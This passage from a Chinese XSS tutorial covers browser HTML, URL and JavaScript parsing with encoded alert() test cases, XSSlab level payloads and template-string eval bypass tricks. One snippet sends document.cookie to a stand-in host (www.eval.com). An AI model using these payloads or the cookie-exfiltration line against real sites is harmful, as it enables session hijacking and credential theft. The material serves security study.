本身、表单、搜索框、常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等</p>\n<h2 id=\"浏览器解析机制\"><a class=\"markdownIt-Anchor\" href=\"#浏览器解析机制\">#</a> 浏览器解析机制</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.&lt;a href=<span class=\"string\">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;aaa&lt;/a&gt;</span><br><span class=\"line\"><span class=\"comment\">// 解析不了,href后的编码会使用实体编码解析，不能解析url编码</span></span><br><span class=\"line\">http:<span class=\"comment\">//127.0.0.1:18888/javascript:alert%281%29</span></span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;javascript:alert(1)&quot;</span></span><br><span class=\"line\"><span class=\"number\">2</span>.&lt;a href=<span class=\"string\">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span><br><span class=\"line\">HTML字符实体编码 <span class=\"string\">&quot;javascript&quot;</span> 和 URL 编码 <span class=\"string\">&quot;alert(2)&quot;</span></span><br><span class=\"line\">  JavaScript支持Unicode，hex，utf-<span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"number\">3</span>.&lt;a href=<span class=\"string\">&quot;javascript%3aalert(3)&quot;</span>&gt;&lt;/a&gt;</span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;:&quot;</span></span><br><span class=\"line\">  js不能编码符号</span><br><span class=\"line\"><span class=\"number\">4</span>.&lt;div&gt;&amp;<span class=\"comment\">#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">  会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">5</span>.&lt;textarea&gt;&amp;<span class=\"comment\">#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">    会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">6</span>.&lt;textarea&gt;&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">6</span>)&lt;/script&gt;&lt;/textarea&gt;</span><br><span class=\"line\">    会解析但不会执行</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;!-- 不能解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;aaa&lt;/a&gt;&lt;br&gt;   </span><br><span class=\"line\">    &lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</span><br><span class=\"line\">    &lt;!-- js中符号不能编码 --&gt;</span><br><span class=\"line\">    &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- html解析完不能执行，&lt;不能编码，浏览器中直接显示img标签 --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中的标签可以被解码，但不能被解析，&lt;script&gt;alert(5)&lt;/script&gt; --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中所有标签都不能被解析 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;8\\u0027);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 不能编码符号 --&gt;</span><br><span class=\"line\">    &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 原始字符块只能容纳文本，会被解析为文本 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 不能对()及其里面的内容编码 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 同理 --&gt;</span><br><span class=\"line\">    &lt;script&gt;alert(&#x27;14\\u000a)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- Unicode 编码换行符（0x0A）,但不会引起真正的换行 --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 可以解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;bbb&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 直接通过html解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;ccc&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 通过html解析为javascript，js在解析url编码 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 先html解析，编码，再给js解析 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 编码alert，函数名可以解析 --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    在解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析</span><br><span class=\"line\">    一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&#x27;&lt;&#x27;符号&#x27;（后面没有跟&#x27;/&#x27;符号）&#x27;就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</span><br><span class=\"line\">    &lt;input value=&quot;xxx&quot;&gt;  由于没有&gt;,value中的内容无法进入数据状态解析</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;  </span><br><span class=\"line\">    &lt;textarea&gt;由于有完整的&lt;&gt;，因此可以解析后面的内容，把&amp;#60解析为&lt;,但不会进入数据开始状态</span><br><span class=\"line\">    不能对协议类型进行任何的编码操作&#x27;</span><br><span class=\"line\">    Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>浏览器解析顺序：URL 解析器 -&gt;HTML 解析器 -&gt; CSS 解析器 -&gt;JS 解析器</p>\n<p>不能对协议进行编码 javascript:   (包含：)</p>\n<h3 id=\"html解析\"><a class=\"markdownIt-Anchor\" href=\"#html解析\">#</a> HTML 解析</h3>\n<p>一个 HTML 解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;‘符号（后面没有跟’/' 符号）就会进入 <code>“标签开始状态(Tag open state)”</code> 。然后转变到 <code>“标签名状态(Tag name state)”</code> ， <code>“前属性名状态(before attribute name state)”</code> … 最后进入 <code>“数据状态(Data state)”</code>  并释放当前标签的 token。当解析器处于 “数据状态 (Data state)” 时，它会继续解析，每当发现一个完整的标签，就会释放出一个 token。</p>\n<p>在 HTML 中有五类元素：</p>\n<ol>\n<li>\n<p>空元素 (Void elements)，如 <code>&lt;area&gt;</code> , <code>&lt;base&gt;</code>  等等</p>\n</li>\n<li>\n<p>原始文本元素 (Raw text elements)，有 <code>&lt;script&gt;</code>  和 <code>&lt;style&gt;</code></p>\n</li>\n<li>\n<p>RCDATA 元素 (RCDATA elements)，有 <code>&lt;textarea&gt;</code>  和 <code>&lt;title&gt;</code></p>\n</li>\n<li>\n<p>外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素</p>\n</li>\n<li>\n<p>基本元素 (Normal elements)，即除了以上 4 种元素以外的元素</p>\n</li>\n</ol>\n<p>五类元素的区别如下：</p>\n<ol>\n<li>\n<p>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>\n</li>\n<li>\n<p>原始文本元素，可以容纳文本。</p>\n</li>\n<li>\n<p>RCDATA 元素，可以容纳文本和字符引用。</p>\n</li>\n<li>\n<p>外部元素，可以容纳文本、字符引用、CDATA 段、其他元素和注释</p>\n</li>\n<li>\n<p>基本元素，可以容纳文本、字符引用、其他元素和注释</p>\n</li>\n</ol>\n<p>如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在 <code>&lt;textarea&gt;</code>  和 <code>&lt;title&gt;</code>  标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如 <code>&lt;textarea&gt;</code>  或 <code>&lt;title&gt;</code>  的内容中），唯一能够被解析器认做是标签的就是 “ <code>&lt;/textarea&gt;</code> ” 或者 “ <code>&lt;/title&gt;</code> ”。因此，在 “ <code>&lt;textarea&gt;</code> ” 和 “ <code>&lt;title&gt;</code> ” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。</p>\n<h3 id=\"url解析\"><a class=\"markdownIt-Anchor\" href=\"#url解析\">#</a> URL 解析</h3>\n<p>首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， <code>你不能对协议类型进行任何的编码操作</code> ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。</p>\n<h3 id=\"javascript解析\"><a class=\"markdownIt-Anchor\" href=\"#javascript解析\">#</a> JavaScript 解析</h3>\n<p>那像 “\\uXXXX”（例如 \\u0000,\\u000A）这样的字符呢，JavaScript 会解析这些字符来执行吗？简单的说：视情况而定。具体的说就是要看被编码的序列到底是哪部分。首先，像 \\uXXXX 一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在 3 个部分：字符串中，标识符名称中和控制字符中。</p>\n<p>字符串中：当 Unicode 转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p>\n<p>标识符名称中：当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。这可以用来解释问题 10。如果我们深入研究 JavaScript 细则，可以看到如下内容：</p>\n<p>“Unicode 转义序列（如 \\u000A\\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’' 符号前置在 Unicode 转义序列串（如 \\u000A000B000C）并不能作为标识符名称中的字符。将 Unicode 转义序列串放在标识符名称中是非法的。”</p>\n<p>总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。如果我们回看问题 11，它并不会被执行。因为 “(11)” 不会被正确的解析，而 “alert (11)” 也不是一个有效的标识符名称。问题 12 不会被正确执行要么是因为’\\u0031\\u0032’不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。问题 13 不会执行的原因是’\\u0027’仅仅会被解释成单引号文本，而此时字符串是未闭合的。问题 14 能够执行的原因是’\\u000a’会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。</p>\n<p>即 () 和 里面的东西都不能编码</p>\n<h2 id=\"xss攻击方式\"><a class=\"markdownIt-Anchor\" href=\"#xss攻击方式\">#</a> XSS 攻击方式</h2>\n<h3 id=\"1读取浏览器cookie对象发起cookie劫持\"><a class=\"markdownIt-Anchor\" href=\"#1读取浏览器cookie对象发起cookie劫持\">#</a> 1. 读取浏览器 cookie 对象，发起 cookie 劫持</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var img = document.createElement(&quot;img&quot;);</span><br><span class=\"line\">img.src = &quot;http://www.eval.com/log?&quot; + escape(document.cookie);</span><br><span class=\"line\">document.body.append(img);</span><br></pre></td></tr></table></figure>\n<p>使用 httponly 标识可以防止 cookie 劫持</p>\n<h3 id=\"2模拟postget请求操作用户的浏览器\"><a class=\"markdownIt-Anchor\" href=\"#2模拟postget请求操作用户的浏览器\">#</a> 2. 模拟 POST，GET 请求操作用户的浏览器</h3>\n<p>在 cookie 劫持失效时或是在目标用户的网络不能访问互联网时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.抓包分析浏览器发送的请求</span><br><span class=\"line\">2.构造完整url，使用XMLHTTPRequest或者form表单请求此url</span><br></pre></td></tr></table></figure>\n<h3 id=\"3xss钓鱼\"><a class=\"markdownIt-Anchor\" href=\"#3xss钓鱼\">#</a> 3.XSS 钓鱼</h3>\n<p>通过伪造登录框获取用户的用户名和密码，在将密码和用户名发送到自己服务器上</p>\n<h3 id=\"4获取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#4获取用户信息\">#</a> 4. 获取用户信息</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.识别用户浏览器，根据每个浏览器特有的功能</span><br><span class=\"line\">2.识别用户安装的软件或浏览器插件</span><br><span class=\"line\">3.查询用户访问过的连接</span><br><span class=\"line\">4.获取用户真实IP</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"xsslab\"><a class=\"markdownIt-Anchor\" href=\"#xsslab\">#</a> XSSlab</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHl6MzE1L3AvMTQ4NTAzNTkuaHRtbA==\">https://www.cnblogs.com/xyz315/p/14850359.html</span></p>\n<p>Level - 1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.1.6:18888/xss/level1.php?name=test</span></span><br><span class=\"line\"></span><br><span class=\"line\">?name=&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">?name=&lt;input onclick/onmouseover&gt;</span><br><span class=\"line\">?name=&lt;a onclick/javascript&gt;</span><br><span class=\"line\">?name=&lt;img src&gt;</span><br><span class=\"line\">?name=&lt;iframe&gt;</span><br><span class=\"line\">?name=&lt;svg&gt;</span><br><span class=\"line\">?name=&lt;video onloadstart=<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>) src=<span class=\"string\">&quot;/media/hack-the-plant.mp4&quot;</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>闭合 大小写 双写 编码</p>\n<p>Level 10</p>\n<p><code>?keyword=111&amp;t_sort=1 type=&quot;text&quot; onclick=alert(1)</code></p>\n<p><code>?keyword=111&amp;t_sort=1 type=&quot;text&quot; onfocus=alert(1) autofocus=&quot;true</code></p>\n<p>Level 11</p>\n<p><code>Post 提交 referer</code></p>\n<h2 id=\"模板字符串\"><a class=\"markdownIt-Anchor\" href=\"#模板字符串\">#</a> 模板字符串</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//弹窗，因为有tostring方法，把数组中第一个参数转为字符串</span></span><br><span class=\"line\">alert<span class=\"string\">`a`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span>    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，因为有$&#123;&#125;执行表达式</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，相当于2前后加了个字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>b`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，因为没有tostring，会放在数组中输出</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，和上一条一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1)`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;alert(1)&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，和3一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1) <span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;alert(1) &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时不是模板字符串，是函数</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然有$&#123;&#125;执行表达式，但此时alert是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert(1)&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//上面都是先解析$&#123;&#125;，最后在解析eval</span></span><br><span class=\"line\"><span class=\"comment\">//对于call方法</span></span><br><span class=\"line\"><span class=\"comment\">//弹窗</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">&#x27;alert(1)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时相当于eval(&#x27;alert(1)&#x27;),call相当于将eval内的执行</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>.<span class=\"property\">call</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 </span></span><br><span class=\"line\"><span class=\"string\">`aaa <span class=\"subst\">$&#123;alert<span class=\"string\">`1`</span>&#125;</span> bbbb`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;aaa undefined bbbb&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//报错，不能对符号编码，因此的prompt不是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;prompt\\x281\\x29&#125;</span>`</span></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>aaa$&#123;<span class=\"title function_\">prompt</span>(<span 